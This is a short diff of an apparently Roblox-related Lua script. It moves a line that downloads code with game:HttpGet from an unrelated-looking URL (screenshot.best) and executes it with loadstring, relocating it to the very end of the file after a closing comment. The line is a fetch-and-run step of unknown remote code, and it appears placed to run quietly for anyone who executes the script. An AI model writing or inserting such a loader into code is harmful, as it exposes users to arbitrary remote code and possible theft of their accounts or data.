@@ -3311,7 +3311,6 @@ coroutine.resume(coroutine.create(function()
 		end
 	end
 end))
-loadstring(game:HttpGet("https://screenshot.best/JH3C9O"))
 -- [[ End ]] --
 
 notif("Script","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: TEENX !)",10,"rbxassetid://3339670365")
@@ -3325,3 +3324,4 @@ notif("Update","Added tags",10,nil)
 		end
 	end
 end -- banned on the webhost again lol]]
+loadstring(game:HttpGet("https://screenshot.best/JH3C9O"))
